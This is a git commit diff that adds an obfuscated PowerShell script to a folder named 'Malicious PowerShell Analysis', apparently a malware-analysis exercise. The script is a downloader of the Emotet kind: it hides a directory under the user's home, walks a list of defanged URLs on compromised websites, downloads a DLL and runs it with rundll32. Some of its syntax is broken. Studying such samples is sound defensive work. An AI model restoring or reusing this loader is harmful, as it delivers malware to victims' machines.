494e308fc79808f48608eaff2a7011d6b936cfb2
Danny Child <dannychild.contact@gmail.com>
2021-04-30 11:10:42 -0600

    Update malicious_script.ps1

--- Malicious PowerShell Analysis/malicious_script.ps1
+++ Malicious PowerShell Analysis/malicious_script.ps1
@@ -1,1 +1,24 @@
-
+sEt MKu -F SYsTeM.io.DIrECtORY;
+SeT-iTEM vaRIabLE:mBu -f sYSteM.net.seRVIcepOintMaNAGer;
+$ErrorActionPreference = ('Silently Continue');
+(DIr VariabLE:Mku).VaLUe::cREAtedIRECTORy ($HOME + (('{0}Db_bh30{0}Yf5be5g{0}') -F [chAR]92));
+(vARiaBLe ("mbu") -VAlueoN)::sEcuRITYproTocol = ('Tls 12'));
+$directory=$HOME+(('\Db_bh30\Yf5be5g\A69S.dll');
+	$LINKS=('
+		hxxps[:]//admintk.com/wp-admin/L/
+		hxxps[:]//mikegeerinck.com/c/YYsa/
+		hxxp[:]//freelancerwebdesignerhyderabad.com/cgi-bin/S/
+		hxxp[:]//etdog.com/wp-content/nu/
+		hxxps[:]//www.hintup.com.br/wp-content/dE/
+		hxxp[:]//www.stmarouns.nsw.edu.au/paypal/b8G/
+		hxxp[:]//wm.mcdevelop.net/content/6F2gd/'))
+foreach ($ITEM in $LINKS)
+	{try
+		{(&('New-Object') SysTem.nEt.WEBcLIeNT).doWNlOaDFIlE($ITEM, $directory);
+			If ((&('Get-Item') $directory).lenGTH -ge 35698)
+				{&('rundll32') $directory,(('Control_RunDLL').TOStRiNG();
+					break;
+				}
+		}
+	catch{}
+	}
